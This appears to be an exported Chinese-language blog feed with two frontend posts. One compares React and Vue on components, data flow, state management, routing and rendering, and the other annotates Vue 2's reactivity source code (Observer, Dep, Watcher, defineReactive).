当用户提交表单时，HTML的默认行为会使这个表单会跳转到一个新页面。在React中亦是如此。但大多数情况下，我们都会构造一个处理提交表单并可访问用户输入表单数据的函数。实现这一点的标准方法是使用一种称为“受控组件”的技术。其值由React控制的输入表单元素称为“受控组件”。this.setState({value: event.target.value}); 当你有处理多个受控的input元素时，你可以通过给每个元素添加一个name属性，来让处理函数根据 event.target.name的值来选择做什么。 1.2.5 状态提升 在React中，状态分享是通过将state数据提升至离需要这些数据的组件最近的父组件来完成的。这就是所谓的状态提升。this.props.xxx 在React应用中，对应任何可变数据理应只有一个单一“数据源”。通常，状态都是首先添加在需要渲染数据的组件中。此时，如果另一个组件也需要这些数据，你可以将数据提升至离它们最近的父组件中。你应该在应用中保持 自上而下的数据流，而不是尝试在不同组件中同步状态。 2.组件化以及组件数据流2.1 React中的组件及数据流 React是单向数据流，数据主要从父节点传递到子节点（通过props）。如果顶层（父级）的某个props改变了，React会重渲染所有的子节点。 React中实现组件有两种实现方式，一种是createClass方法，另一种是通过ES2015的思想类继承React.Component来实现 在React应用中，按钮、表单、对话框、整个屏幕的内容等，这些通常都被表示为组件。 React推崇的是函数式编程和单向数据流：给定原始界面（或数据），施加一个变化，就能推导出另外一个状态（界面或者数据的更新） 组件可以将UI切分成一些的独立的、可复用的部件，这样你就只需专注于构建每一个单独的部件。组件从概念上看就像是函数，它可以接收任意的输入值（称之为“props”），并返回一个需要在页面上展示的React元素。1. props的只读性 无论是使用函数或是类来声明一个组件，它决不能修改它自己的props。 所有的React组件必须像纯函数那样使用它们的props。 props与state的区别 props是property的缩写，可以理解为HTML标签的attribute。不可以使用this.props直接修改props，因为props是只读的，props是用于整个组件树中传递数据和配置。在当前组件访问props，使用this.props。 props是一个组件的设置参数，可以在父控件中选择性设置。父组件对子控件的props进行赋值，并且props的值不可改变。一个子控件自身不能改变自己的 props。 state:当一个组件 mounts的时候，state如果设置有默认值的会被使用，并且state可能时刻的被改变。一个子控件自身可以管理自己的state，但是需要注意的是，无法管理其子控件的state。所以可以认为，state是子控件自身私有的。 每个组件都有属于自己的state，state和props的区别在于前者(state)只存在于组件内部，只能从当前组件调用this.setState修改state值（不可以直接修改this.state！）。 props是一个父组件传递给子组件的数据流，可以一直的被传递到子孙组件中。然而 state代表的是子组件自身的内部状态。从语义上讲，改变组件的状态，可能会导致DOM结构的改变或者重新渲染。而props是父组件传递的参数，所以可以被用于初始化渲染和改变组件自身的状态，虽然大多数时候组件的状态是又外部事件触发改变的。我们需要知道的是，无论是state改变，还是父组件传递的 props改变，render方法都可能会被执行。 一般我们更新子组件都是通过改变state值，更新新子组件的props值从而达到更新。 2.1.1 组件之间的通信父子组件数通信父与子之间通props属性进行传递子与父之间，父组件定义事件，子组件触发父组件中的事件时，通过实参的形式来改变父组件中的数据来通信即： 父组件更新组件状态 —–props—–&gt; 子组件更新 子组件更新父组件状态 —–需要父组件传递回调函数—–&gt; 子组件调用触发 非父子组件之间的通信，嵌套不深的非父子组件可以使共同父组件，触发事件函数传形参的方式来实现兄弟组件：（1） 按照React单向数据流方式，我们需要借助父组件进行传递，通过父组件回调函数改变兄弟组件的props。 其实这种实现方式与子组件更新父组件状态的方式是大同小异的。 （2） 当组件层次很深的时候，在这里，React官方给我们提供了一种上下文方式，可以让子组件直接访问祖先的数据或函数，无需从祖先组件一层层地传递数据到子组件中。 2.1.2 组件的生命周期12345678construtor() //创建组件componentWillMount() //组件挂载之前componentDidMount() // 组件挂载之后componentWillReceiveProps() // 父组件发生render的时候子组件调用该函数shouldComponentUpdate() // 组件挂载之后每次调用setState后都会调用该函数判断是否需要重新渲染组件，默认返回truecomponentDidUpdate() // 更新render() //渲染，`React`中的核心函数componentWillUnmount() //组件被卸载的时候调用，一般在componentDidMount注册的事件需要在这里删除 2.2 Vue中的组件和数据流2.2.1 组件化应用构建 组件系统是 Vue 的另一个重要概念，因为它是一种抽象，允许我们使用小型、独立和通常可复用的组件构建大型应用。 在 Vue 里，一个组件本质上是一个拥有预定义选项的一个 Vue 实例 在一个大型应用中，有必要将整个应用程序划分为组件，以使开发可管理。 组件(component)是 Vue 最强大的功能之一。组件可以帮助你扩展基本的 HTML 元素，以封装可重用代码。在较高层面上，组件是 Vue 编译器附加行为后的自定义元素。在某些情况下，组件也可以是原生 HTML 元素的形式，以特定的 is 特性扩展。 组件中，data必须是一个函数 组件可以扩展 HTML 元素，封装可重用的代码。在较高层面上，组件是自定义元素，Vue.js 的编译器为它添加特殊功能。在有些情况下，组件也可以是原生 HTML 元素的形式，以 is 特性扩展。 2.2.2 响应式 当一个 Vue 实例被创建时，它向 Vue 的响应式系统中加入了其 data 对象中能找到的所有的属性。当这些属性的值发生改变时，视图将会产生“响应”，即匹配更新为新的值。 当这些数据改变时，视图会进行重渲染。值得注意的是只有当实例被创建时 data 中存在的属性是响应式的。 2.2.3 组件的生命周期 每个 Vue 实例在被创建之前都要经过一系列的初始化过程。例如需要设置数据监听、编译模板、挂载实例到 DOM、在数据变化时更新 DOM 等。同时在这个过程中也会运行一些叫做生命周期钩子的函数，给予用户机会在一些特定的场景下添加他们自己的代码。 比如 created 钩子可以用来在一个实例被创建之后执行代码，也有一些其它的钩子，在实例生命周期的不同场景下调用，如 mounted、updated、destroyed。钩子的 this 指向调用它的 Vue 实例。 生命周期图示： 2.2.3 组件之间的通信 Vue默认的是单向数据流，这是Vue直接提出来说明的，父组件默认可以向子组件传递数据，但是子组件向父组件传递数据就需要额外设置了。 Vue 也支持双向绑定，默认为单向绑定，数据从父组件单向传给子组件。在大型应用中使用单向绑定让数据流易于理解。 父子组件之间的数据通信是通过Prop和自定义事件实现的，而非父子组件可以使用订阅/发布模式实现（类似于Angualr中的非父子指令之间的通信），再复杂一点也是建议使用状态管理（Vuex）。 在 Vue 中，父子组件之间的关系可以概述为：props 向下，events 向上。父组件通过 props 向下传递数据给子组件，子组件通过 events 发送消息给父组件。 1.父向子 每个组件实例都有自己的孤立隔离作用域。也就是说，不能（也不应该）直接在子组件模板中引用父组件数据。要想在子组件模板中引用父组件数据，可以使用 props 将数据向下传递到子组件。 每个 prop 属性,都可以控制是否从父组件的自定义属性中接收数据。子组件需要使用 props 选项显式声明 props，以便它可以从父组件接收到期望的数据。 动态props，类似于将一个普通属性绑定到一个表达式，我们还可以使用 v-bind 将 props 属性动态地绑定到父组件中的数据。无论父组件何时更新数据，都可以将数据向下流入到子组件中 2.子向父 使用自定义事件 每个 Vue 实例都接入了一个事件接口(events interface)，也就是说，这些 Vue 实例可以做到： 使用 on(eventName)监听一个事件−使用emit(eventName) 触发一个事件 3. 非父子组件通信 可以使用一个空的 Vue 实例作为一个事件总线中心(central event bus)，用emit触发事件，on监听事件 2.2.4 单向数据流单向数据流示意图： 3.状态管理3.1 React中的状态管理：Flux Redux 是 React 生态环境中最流行的 Flux 实现。Redux 事实上无法感知视图层，所以它能够轻松的通过一些简单绑定和 Vue 一起使用。 1、创建actions 1、定义动作，事件触发需要用`dispatcher`来调用 2、行为，如增加操作、删除操作、更新操作，就是一堆函数。 2、创建store 1、`store`中包含应用的状态和逻辑，用来管理应用中不同的状态和逻辑，相当于`Model`层 3、创建dispatcher 1、在`dispatcher`中通过`register`来给每个`action`注对应的的`store`中的方法 4、在view层调用action中的方法 1、就是各类`component` 3.2 Vue中的状态管理vuex Vuex借鉴了 Flux、Redux、和 The Elm Architecture。与其他模式不同的是，Vuex 是专门为 Vue.js 设计的状态管理库，以利用 Vue.js 的细粒度数据响应机制来进行高效的状态更新。这使得它能够更好地和 Vue 进行整合，同时提供简洁的 API 和改善过的开发体验。 组件不允许直接修改属于 store 实例的 state，而应执行 action 来分发 (dispatch) 事件通知 store 去改变，我们最终达成了 Flux 架构。这样约定的好处是，我们能够记录所有 store 中发生的 state 改变，同时实现能做到记录变更 (mutation)、保存状态快照、历史回滚/时光旅行的先进的调试工具。 每一个 Vuex 应用的核心就是 store（仓库）。“store”基本上就是一个容器，它包含着你的应用中大部分的状态 Vuex 和单纯的全局对象有以下两点不同： 1、`Vue`x 的状态存储是响应式的。当 `Vue` 组件从 `store` 中读取状态的时候，若 `store` 中的状态发生变化，那么相应的组件也会相应地得到高效更新。 2、你不能直接改变 `store` 中的状态。改变 `store` 中的状态的唯一途径就是显式地提交 (commit) mutation。这样使得我们可以方便地跟踪每一个状态的变化，从而让我们能够实现一些工具帮助我们更好地了解我们的应用。 3、`state` Vuex 使用单一状态树——是的，用一个对象就包含了全部的应用层级状态。至此它便作为一个“唯一数据源 (SSOT)”而存在。这也意味着，每个应用将仅仅包含一个 store 实例。单一状态树让我们能够直接地定位任一特定的状态片段，在调试的过程中也能轻易地取得整个当前应用状态的快照。这也意味着，每个应用将仅仅包含一个 store 实例。 1、Getters 从state中获取状态值，有时候我们需要从 store 中的 state 中派生出一些状态，例如对列表进行过滤并计数。 1、Mutation 1、更改 `Vuex` 的 `store` 中的状态的唯一方法是提交 mutation。`Vuex` 中的 mutation 非常类似于事件：每个 mutation 都有一个字符串的 事件类型 (type) 和 一个 回调函数 (handler)。这个回调函数就是我们实际进行状态更改的地方，并且它会接受 `state` 作为第一个参数。 2、你不能直接调用一个 mutation handler。这个选项更像是事件注册：“当触发一个类型为 increment 的 mutation 时，调用此函数。”要唤醒一个 mutation handler，你需要以相应的 type 调用 `store.commit` 方法 2、Action 1、Action 类似于 mutation，不同在于： 2、Action 提交的是 mutation，而不是直接变更状态。 3、Action 可以包含任意异步操作。 4、dispatch分发action 3、Module 由于使用单一状态树，应用的所有状态会集中到一个比较大的对象。当应用变得非常复杂时，store 对象就有可能变得相当臃肿。 Vuex 允许我们将 store 分割成模块（module）。每个模块拥有自己的 state、mutation、action、getter、甚至是嵌套子模块——从上至下进行同样方式的分割 4.路由 两者的路由很相似，都是利用了组件化思想4.1 React中的路由 在路由库的问题上，React 选择把问题交给社区维护，因此创建了一个更分散的生态系统。但相对的，React 的生态系统相比 Vue 更加繁荣。 React中，需要引入react-router库，使用时，路由器Router就是React的一个组件。 Router组件本身只是一个容器，真正的路由要通过Route组件定义。 Route组件定义了URL路径与组件的对应关系。你可以同时使用多个Route组件。 12345&lt;Router history=&#123;hashHistory&#125;&gt; &lt;Route path="/" component=&#123;App&#125;/&gt; &lt;Route path="/repos" component=&#123;Repos&#125;/&gt; &lt;Route path="/about" component=&#123;About&#125;/&gt;&lt;/Router&gt; Link组件用于取代元素，生成一个链接，允许用户点击后跳转到另一个路由。它基本上就是元素的React 版本，可以接收Router的状态。 4.2 Vue中的路由 Vue 的路由库和状态管理库都是由官方维护支持且与核心库同步更新的。 使用 Vue.js ，我们已经可以通过组合组件来组成应用程序，当你要把 vue-router 添加进来，我们需要做的是，将组件(components)映射到路由(routes)，然后告诉 vue-router 在哪里渲染它们。 12345678910111213&lt;div id="app"&gt; &lt;h1&gt;Hello App!&lt;/h1&gt; &lt;p&gt; &lt;!-- 使用 router-link 组件来导航. --&gt; &lt;!-- 通过传入 `to` 属性指定链接. --&gt; &lt;!-- &lt;router-link&gt; 默认会被渲染成一个 `&lt;a&gt;` 标签 --&gt; &lt;router-link to="/foo"&gt;Go to Foo&lt;/router-link&gt; &lt;router-link to="/bar"&gt;Go to Bar&lt;/router-link&gt; &lt;/p&gt; &lt;!-- 路由出口 --&gt; &lt;!-- 路由匹配到的组件将渲染在这里 --&gt; &lt;router-view&gt;&lt;/router-view&gt;&lt;/div&gt; 5. 渲染性能对比 在操作界面时，要尽量减少对DOM的操作，Vue 和 React 都使用虚拟DOM来实现，并且两者工作一样好。 尽量减少除DOM操作以外的其他操作。（Vue和React的不同） 5.1 React视图渲染 React 的渲染建立在 Virtual DOM 上——一种在内存中描述 DOM 树状态的数据结构。当状态发生变化时，React 重新渲染 Virtual DOM，比较计算之后给真实 DOM 打补丁。 Virtual DOM 提供了函数式的方法描述视图，它不使用数据观察机制，每次更新都会重新渲染整个应用，因此从定义上保证了视图与数据的同步。它也开辟了 JavaScript 同构应用的可能性。 在超大量数据的首屏渲染速度上，React 有一定优势，因为 Vue 的渲染机制启动时候要做的工作比较多，而且 React 支持服务端渲染。 元素是构成 React 应用的最小单位。元素用来描述你在屏幕上看到的内容，与浏览器的 DOM 元素不同，React 当中的元素事实上是普通的对象，React DOM 可以确保 浏览器 DOM 的数据内容与 React 元素保持一致。 我们用React 开发应用时一般只会定义一个根节点。但如果你是在一个已有的项目当中引入 React 的话，你可能会需要在不同的部分单独定义 React 根节点。我们将 元素传入一个名为 ReactDOM.render() 的方法来将其渲染到页面上，页面上就会显示该元素。 组件渲染 当React遇到的元素是用户自定义的组件，它会将JSX属性作为单个对象传递给该组件,这个对象称之为“props”。 5.2 Vue视图渲染 Vue 通过建立一个虚拟 DOM 对真实 DOM 发生的变化保持追踪。 Vue渲染的过程如下： new Vue，执行初始化 挂载$mount方法，通过自定义Render方法、template、el等生成Render函数 通过Watcher监听数据的变化 当数据发生变化时，Render函数执行生成VNode对象 通过patch方法，对比新旧VNode对象，通过DOM Diff算法，添加、修改、删除真正的DOM元素 小结总结一下，我们发现， Vue的优势包括： 模板和渲染函数的弹性选择 简单的语法及项目创建 更快的渲染速度和更小的体积React的优势包括： 更适用于大型应用和更好的可测试性 同时适用于Web端和原生App 更大的生态圈带来的更多支持和工具 而实际上，React和Vue都是非常优秀的框架，它们之间的相似之处多过不同之处，并且它们大部分最棒的功能是相通的： 利用虚拟DOM实现快速渲染 轻量级 响应式和组件化 服务器端渲染 易于集成路由工具，打包工具以及状态管理工具 优秀的支持和社区]]></content>
      <categories>
        <category>React</category>
      </categories>
      <tags>
        <tag>React</tag>
        <tag>不同技术栈</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Vue_vue数据监听原理]]></title>
    <url>%2F2018%2F04%2F17%2FVue_vue%E6%95%B0%E6%8D%AE%E7%9B%91%E5%90%AC%E5%8E%9F%E7%90%86%2F</url>
    <content type="text"><![CDATA[首先让我们从最简单的一个实例Vue入手:123const app = new Vue(&#123; // options 传入一个选项obj.这个obj即对于这个vue实例的初始化&#125;) 通过查阅文档，我们可以知道这个options可以接受: 选项/数据 data props propsData(方便测试使用) computed methods watch 选项 / DOM 选项 / 生命周期钩子 选项 / 资源 选项 / 杂项 具体未展开的内容请自行查阅相关文档，接下来让我们来看看传入的选项/数据是如何管理数据之间的相互依赖的。1234567891011121314151617181920212223242526272829303132const app = new Vue(&#123; el: '#app', props: &#123; a: &#123; type: Object, default () &#123; return &#123; key1: 'a', key2: &#123; a: 'b' &#125; &#125; &#125; &#125; &#125;, data: &#123; msg1: 'Hello world!', arr: &#123; arr1: 1 &#125; &#125;, watch: &#123; a (newVal, oldVal) &#123; console.log(newVal, oldVal) &#125; &#125;, methods: &#123; go () &#123; console.log('This is simple demo') &#125; &#125;&#125;) 我们使用Vue这个构造函数去实例化了一个vue实例app。传入了props, data, watch, methods等属性。在实例化的过程中，Vue提供的构造函数就使用我们传入的options去完成数据的依赖管理，初始化的过程只有一次，但是在你自己的程序当中，数据的依赖管理的次数不止一次。 那Vue的构造函数到底是怎么实现的呢？ Vue12345678910111213141516// 构造函数function Vue (options) &#123; if (process.env.NODE_ENV !== 'production' &amp;&amp; !(this instanceof Vue)) &#123; warn('Vue is a constructor and should be called with the `new` keyword') &#125; this._init(options)&#125;// 对Vue这个class进行mixin,即在原型上添加方法// Vue.prototype.* = function () &#123;&#125;initMixin(Vue)stateMixin(Vue)eventsMixin(Vue)lifecycleMixin(Vue)renderMixin(Vue) 当我们调用new Vue的时候，事实上就调用的Vue原型上的_init方法.123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// 原型上提供_init方法,新建一个vue实例并传入options参数Vue.prototype._init = function (options?: Object) &#123; const vm: Component = this // a uid vm._uid = uid++ let startTag, endTag // a flag to avoid this being observed vm._isVue = true // merge options if (options &amp;&amp; options._isComponent) &#123; // optimize internal component instantiation // since dynamic options merging is pretty slow, and none of the // internal component options needs special treatment. initInternalComponent(vm, options) &#125; else &#123; // 将传入的这些options选项挂载到vm.$options属性上 vm.$options = mergeOptions( // components/filter/directive resolveConstructorOptions(vm.constructor), // this._init()传入的options options || &#123;&#125;, vm ) &#125; /* istanbul ignore else */ if (process.env.NODE_ENV !== 'production') &#123; initProxy(vm) &#125; else &#123; vm._renderProxy = vm &#125; // expose real self vm._self = vm // 自身的实例 // 接下来所有的操作都是在这个实例上添加方法 initLifecycle(vm) // lifecycle初始化 initEvents(vm) // events初始化 vm._events, 主要是提供vm实例上的$on/$emit/$off/$off等方法 initRender(vm) // 初始化渲染函数,在vm上绑定$createElement方法 callHook(vm, 'beforeCreate') // 钩子函数的执行, beforeCreate initInjections(vm) // resolve injections before data/props initState(vm) // Observe data添加对data的监听, 将data转化为getters/setters initProvide(vm) // resolve provide after data/props callHook(vm, 'created') // 钩子函数的执行, created // vm挂载的根元素 if (vm.$options.el) &#123; vm.$mount(vm.$options.el) &#125;&#125; 其中在this._init()方法中调用initState(vm),完成对vm这个实例的数据的监听,也是本文所要展开说的具体内容。1234567891011121314151617181920export function initState (vm: Component) &#123; // 首先在vm上初始化一个_watchers数组，缓存这个vm上的所有watcher vm._watchers = [] // 获取options,包括在new Vue传入的，同时还包括了Vue所继承的options const opts = vm.$options // 初始化props属性 if (opts.props) initProps(vm, opts.props) // 初始化methods属性 if (opts.methods) initMethods(vm, opts.methods) // 初始化data属性 if (opts.data) &#123; initData(vm) &#125; else &#123; observe(vm._data = &#123;&#125;, true /* asRootData */) &#125; // 初始化computed属性 if (opts.computed) initComputed(vm, opts.computed) // 初始化watch属性 if (opts.watch) initWatch(vm, opts.watch)&#125; initProps我们在实例化app的时候，在构造函数里面传入的options中有props属性：12345678910111213props: &#123; a: &#123; type: Object, default () &#123; return &#123; key1: 'a', key2: &#123; a: 'b' &#125; &#125; &#125; &#125;&#125; 123456789101112131415161718192021222324252627282930function initProps (vm: Component, propsOptions: Object) &#123; // propsData主要是为了方便测试使用 const propsData = vm.$options.propsData || &#123;&#125; // 新建vm._props对象，可以通过app实例去访问 const props = vm._props = &#123;&#125; // cache prop keys so that future props updates can iterate using Array // instead of dynamic object key enumeration. // 缓存的prop key const keys = vm.$options._propKeys = [] const isRoot = !vm.$parent // root instance props should be converted observerState.shouldConvert = isRoot for (const key in propsOptions) &#123; // this._init传入的options中的props属性 keys.push(key) // 注意这个validateProp方法，不仅完成了prop属性类型验证的，同时将prop的值都转化为了getter/setter,并返回一个observer const value = validateProp(key, propsOptions, propsData, vm) // 将这个key对应的值转化为getter/setter defineReactive(props, key, value) // static props are already proxied on the component's prototype // during Vue.extend(). We only need to proxy props defined at // instantiation here. // 如果在vm这个实例上没有key属性，那么就通过proxy转化为proxyGetter/proxySetter, 并挂载到vm实例上，可以通过app._props[key]这种形式去访问 if (!(key in vm)) &#123; proxy(vm, `_props`, key) &#125; &#125; observerState.shouldConvert = true&#125; 接下来看下validateProp(key, propsOptions, propsData, vm)方法内部到底发生了什么。123456789101112131415161718192021222324252627282930313233343536373839export function validateProp ( key: string, propOptions: Object, // $options.props属性 propsData: Object, // $options.propsData属性 vm?: Component): any &#123; const prop = propOptions[key] // 如果在propsData测试props上没有缓存的key const absent = !hasOwn(propsData, key) let value = propsData[key] // 处理boolean类型的数据 // handle boolean props if (isType(Boolean, prop.type)) &#123; if (absent &amp;&amp; !hasOwn(prop, 'default')) &#123; value = false &#125; else if (!isType(String, prop.type) &amp;&amp; (value === '' || value === hyphenate(key))) &#123; value = true &#125; &#125; // check default value if (value === undefined) &#123; // default属性值，是基本类型还是function // getPropsDefaultValue见下面第一段代码 value = getPropDefaultValue(vm, prop, key) // since the default value is a fresh copy, // make sure to observe it. const prevShouldConvert = observerState.shouldConvert observerState.shouldConvert = true // 将value的所有属性转化为getter/setter形式 // 并添加value的依赖 // observe方法的分析见下面第二段代码 observe(value) observerState.shouldConvert = prevShouldConvert &#125; if (process.env.NODE_ENV !== 'production') &#123; assertProp(prop, key, value, vm, absent) &#125; return value&#125; 1234567891011121314151617181920212223// 获取prop的默认值function getPropDefaultValue (vm: ?Component, prop: PropOptions, key: string): any &#123; // no default, return undefined // 如果没有default属性的话，那么就返回undefined if (!hasOwn(prop, 'default')) &#123; return undefined &#125; const def = prop.default // the raw prop value was also undefined from previous render, // return previous default value to avoid unnecessary watcher trigger if (vm &amp;&amp; vm.$options.propsData &amp;&amp; vm.$options.propsData[key] === undefined &amp;&amp; vm._props[key] !== undefined) &#123; return vm._props[key] &#125; // call factory function for non-Function types // a value is Function if its prototype is function even across different execution context // 如果是function 则调用def.call(vm) // 否则就返回default属性对应的值 return typeof def === 'function' &amp;&amp; getType(prop.type) !== 'Function' ? def.call(vm) : def&#125; Vue提供了一个observe方法,在其内部实例化了一个Observer类，并返回Observer的实例。每一个Observer实例对应记录了props中这个的default value的所有依赖(仅限object类型)，这个Observer实际上就是一个主题，它维护了一个数组this.subs = []用以收集相关的subs(观察者)(即这个主题的依赖)。通过将default value转化为getter/setter形式，同时添加一个自定义__ob__属性，这个属性就对应Observer实例。 说起来有点绕，还是让我们看看我们给的demo里传入的options配置:12345678910111213props: &#123; a: &#123; type: Object, default () &#123; return &#123; key1: 'a', key2: &#123; a: 'b' &#125; &#125; &#125; &#125;&#125; 在往上数的第二段代码里面的方法obervse(value)，即对{key1: &#39;a&#39;, key2: {a: &#39;b&#39;}}进行依赖的管理，同时将这个obj所有的属性值都转化为getter/setter形式。此外，Vue还会将props属性都代理到vm实例上，通过vm.key1,vm.key2就可以访问到这个属性。 此外，还需要了解下在Vue中管理依赖的一个非常重要的类: Dep12345678910export default class Dep &#123; constructor () &#123; this.id = uid++ this.subs = [] &#125; addSub () &#123;...&#125; // 添加观察者(依赖) removeSub () &#123;...&#125; // 删除观察者(依赖) depend () &#123;...&#125; // 检查当前Dep.target是否存在以及判断这个watcher已经被添加到了相应的依赖当中，如果没有则添加观察者(依赖)，如果已经被添加了那么就不做处理 notify () &#123;...&#125; // 通知观察者(依赖)更新&#125; 在Vue的整个生命周期当中，你所定义的响应式的数据上都会绑定一个Dep实例去管理其依赖。它实际上就是主题和观察者联系的一个桥梁。 刚才谈到了对于依赖的管理，它的核心之一就是主题类Observer这个类：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950export class Observer &#123; value: any; dep: Dep; vmCount: number; // number of vms that has this object as root $data constructor (value: any) &#123; this.value = value // dep记录了和这个value值的相关依赖 this.dep = new Dep() this.vmCount = 0 // value其实就是vm._data, 即在vm._data上添加__ob__属性 def(value, '__ob__', this) // 如果是数组 if (Array.isArray(value)) &#123; // 首先判断是否能使用__proto__属性 const augment = hasProto ? protoAugment : copyAugment augment(value, arrayMethods, arrayKeys) // 遍历数组，并将obj类型的属性改为getter/setter实现 this.observeArray(value) &#125; else &#123; // 遍历obj上的属性，将每个属性改为getter/setter实现 this.walk(value) &#125; &#125; /** * Walk through each property and convert them into * getter/setters. This method should only be called when * value type is Object. */ // 将每个property对应的属性都转化为getter/setters,只能是当这个value的类型为Object时 walk (obj: Object) &#123; const keys = Object.keys(obj) for (let i = 0; i &lt; keys.length; i++) &#123; defineReactive(obj, keys[i], obj[keys[i]]) &#125; &#125; /** * Observe a list of Array items. */ // 监听array中的item observeArray (items: Array&lt;any&gt;) &#123; for (let i = 0, l = items.length; i &lt; l; i++) &#123; observe(items[i]) &#125; &#125;&#125; walk方法里面调用defineReactive方法：通过遍历这个object的key，并将对应的value转化为getter/setter形式，通过闭包维护一个dep，在getter方法当中定义了这个key是如何进行依赖的收集，在setter方法中定义了当这个key对应的值改变后，如何完成相关依赖数据的更新。但是从源码当中，我们却发现当getter函数被调用的时候并非就一定会完成依赖的收集，其中还有一层判断，就是Dep.target是否存在。12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667/** * Define a reactive property on an Object. */export function defineReactive ( obj: Object, key: string, val: any, customSetter?: Function) &#123; // 每个属性新建一个dep实例，管理这个属性的依赖 const dep = new Dep() // 或者属性描述符 const property = Object.getOwnPropertyDescriptor(obj, key) // 如果这个属性是不可配的，即无法更改 if (property &amp;&amp; property.configurable === false) &#123; return &#125; // cater for pre-defined getter/setters const getter = property &amp;&amp; property.get const setter = property &amp;&amp; property.set // 递归去将val转化为getter/setter // childOb将子属性也转化为Observer let childOb = observe(val) Object.defineProperty(obj, key, &#123; enumerable: true, configurable: true, // 定义getter --&gt;&gt; reactiveGetter get: function reactiveGetter () &#123; const value = getter ? getter.call(obj) : val // 定义相应的依赖 if (Dep.target) &#123; // Dep.target.addDep(this) // 即添加watch函数 // dep.depend()及调用了dep.addSub()只不过中间需要判断是否这个id的dep已经被包含在内了 dep.depend() // childOb也添加依赖 if (childOb) &#123; childOb.dep.depend() &#125; if (Array.isArray(value)) &#123; dependArray(value) &#125; &#125; return value &#125;, // 定义setter --&gt;&gt; reactiveSetter set: function reactiveSetter (newVal) &#123; const value = getter ? getter.call(obj) : val /* eslint-disable no-self-compare */ if (newVal === value || (newVal !== newVal &amp;&amp; value !== value)) &#123; return &#125; if (setter) &#123; setter.call(obj, newVal) &#125; else &#123; val = newVal &#125; // 对得到的新值进行observe childOb = observe(newVal) // 相应的依赖进行更新 dep.notify() &#125; &#125;)&#125; 在上文中提到了Dep类是链接主题和观察者的桥梁。同时在Dep的实现当中还有一个非常重要的属性就是Dep.target，它事实就上就是一个观察者，只有当Dep.target(观察者)存在的时候，调用属性的getter函数的时候才能完成依赖的收集工作。1234567891011Dep.target = nullconst targetStack = []export function pushTarget (_target: Watcher) &#123; if (Dep.target) targetStack.push(Dep.target) Dep.target = _target&#125;export function popTarget () &#123; Dep.target = targetStack.pop()&#125; 那么Vue是如何来实现观察者的呢？Vue里面定义了一个类: Watcher，在Vue的整个生命周期当中，会有4类地方会实例化Watcher： Vue实例化的过程中有watch选项 Vue实例化的过程中有computed计算属性选项 Vue原型上有挂载$watch方法: Vue.prototype.$watch，可以直接通过实例调用this.$watch方法 Vue生成了render函数，更新视图时123456789101112131415161718192021222324252627282930313233343536373839404142434445constructor ( vm: Component, expOrFn: string | Function, cb: Function, options?: Object ) &#123; // 缓存这个实例vm this.vm = vm // vm实例中的_watchers中添加这个watcher vm._watchers.push(this) // options if (options) &#123; this.deep = !!options.deep this.user = !!options.user this.lazy = !!options.lazy this.sync = !!options.sync &#125; else &#123; this.deep = this.user = this.lazy = this.sync = false &#125; this.cb = cb this.id = ++uid // uid for batching this.active = true this.dirty = this.lazy // for lazy watchers .... // parse expression for getter if (typeof expOrFn === 'function') &#123; this.getter = expOrFn &#125; else &#123; this.getter = parsePath(expOrFn) if (!this.getter) &#123; this.getter = function () &#123;&#125; &#125; &#125; // 通过get方法去获取最新的值 // 如果lazy为true, 初始化的时候为undefined this.value = this.lazy ? undefined : this.get() &#125; get () &#123;...&#125; addDep () &#123;...&#125; update () &#123;...&#125; run () &#123;...&#125; evaluate () &#123;...&#125; run () &#123;...&#125; Watcher接收的参数当中expOrFn定义了用以获取watcher的getter函数。expOrFn可以有2种类型：string或function.若为string类型，首先会通过parsePath方法去对string进行分割(仅支持.号形式的对象访问)。在除了computed选项外，其他几种实例化watcher的方式都是在实例化过程中完成求值及依赖的收集工作：this.value = this.lazy ? undefined : this.get().在Watcher的get方法中: !!!前方高能123456789101112131415161718192021222324252627282930get () &#123; // pushTarget即设置当前的需要被执行的watcher pushTarget(this) let value const vm = this.vm if (this.user) &#123; try &#123; // $watch(function () &#123;&#125;) // 调用this.getter的时候，触发了属性的getter函数 // 在getter中进行了依赖的管理 value = this.getter.call(vm, vm) console.log(value) &#125; catch (e) &#123; handleError(e, vm, `getter for watcher "$&#123;this.expression&#125;"`) &#125; &#125; else &#123; // 如果是新建模板函数，则会动态计算模板与data中绑定的变量，这个时候就调用了getter函数，那么就完成了dep的收集 // 调用getter函数，则同时会调用函数内部的getter的函数，进行dep收集工作 value = this.getter.call(vm, vm) &#125; // "touch" every property so they are all tracked as // dependencies for deep watching // 让每个属性都被作为dependencies而tracked, 这样是为了deep watching if (this.deep) &#123; traverse(value) &#125; popTarget() this.cleanupDeps() return value&#125; 一进入get方法，首先进行pushTarget(this)的操作，此时Vue当中Dep.target = 当前这个watcher,接下来进行value = this.getter.call(vm, vm)操作，在这个操作中就完成了依赖的收集工作。还是拿文章一开始的demo来说，在vue实例化的时候传入了watch选项：123456789101112131415161718props: &#123; a: &#123; type: Object, default () &#123; return &#123; key1: 'a', key2: &#123; a: 'b' &#125; &#125; &#125; &#125;&#125;,watch: &#123; a (newVal, oldVal) &#123; console.log(newVal, oldVal) &#125;&#125;, 在Vue的initState()开始执行后，首先会初始化props的属性为getter/setter函数，然后在进行initWatch初始化的时候，这个时候初始化watcher实例，并调用get()方法，设置Dep.target = 当前这个watcher实例，进而到value = this.getter.call(vm, vm)的操作。在调用this.getter.call(vm, vm)的方法中，便会访问props选项中的a属性即其getter函数。在a属性的getter函数执行过程中，因为Dep.target已经存在，那么就进入了依赖收集的过程:12345678910111213if (Dep.target) &#123; // Dep.target.addDep(this) // 即添加watch函数 // dep.depend()及调用了dep.addSub()只不过中间需要判断是否这个id的dep已经被包含在内了 dep.depend() // childOb也添加依赖 if (childOb) &#123; childOb.dep.depend() &#125; if (Array.isArray(value)) &#123; dependArray(value) &#125; &#125; dep是一开始初始化的过程中，这个属性上的dep属性。调用dep.depend()函数：123456depend () &#123; if (Dep.target) &#123; // Dep.target为一个watcher Dep.target.addDep(this) &#125;&#125; Dep.target也就刚才的那个watcher实例，这里也就相当于调用了watcher实例的addDep方法: watcher.addDep(this)，并将dep观察者传入。在addDep方法中完成依赖收集:12345678910addDep (dep: Dep) &#123; const id = dep.id if (!this.newDepIds.has(id)) &#123; this.newDepIds.add(id) this.newDeps.push(dep) if (!this.depIds.has(id)) &#123; dep.addSub(this) &#125; &#125; &#125; 